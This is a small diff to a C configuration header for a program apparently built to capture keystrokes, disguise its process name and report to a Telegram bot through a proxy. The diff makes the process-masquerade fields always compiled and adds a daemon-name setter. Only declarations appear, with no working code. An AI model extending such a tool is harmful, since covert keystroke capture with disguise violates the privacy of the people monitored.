@@ -48,10 +48,8 @@ typedef struct {
   size_t keyboard_flush_ms;
   int keyboard_shortcuts;
   const char *keyboard_layout;
-#ifdef C2T_ENABLE_PROCESS_MASQUERADE
   const char *daemon_name;
   const char *supervisor_name;
-#endif
   const char *telegram_bot_token;
   const char *telegram_chat_id;
   const char *proxy;
@@ -64,6 +62,7 @@ void c2t_config_load(const char *executable_path);
 void c2t_config_load_environment(void);
 const char *c2t_config_apply_arguments(int argc, char **argv);
 void c2t_config_set_chat_id(const char *chat_id);
+void c2t_config_set_daemon_name(const char *daemon_name);
 [[nodiscard]] const c2t_config_t *c2t_config_get(void);
 
 #endif
